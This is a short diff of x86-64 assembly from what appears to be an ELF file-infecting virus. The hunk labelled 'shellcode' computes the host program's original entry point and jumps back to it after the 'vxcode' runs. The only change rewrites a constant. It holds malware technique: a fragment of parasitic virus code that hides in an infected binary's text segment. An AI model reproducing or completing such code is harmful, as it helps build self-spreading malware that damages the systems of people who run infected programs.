@@ -29,7 +29,7 @@ shellcode:
 	pop rdi
 
 	call get_eip
-	sub rax, 0x4f ; size of virus code
+	sub rax, 0x04f ; size of virus code
 	sub rax, 0x173d1 ; textSegment.virtualAddr + textSegment.FileSZ AKA end of textSegment original code and start of vxcode, rax is now the base virtual addr
 	add rax, 0x5b20 ; OEP
 	jmp rax
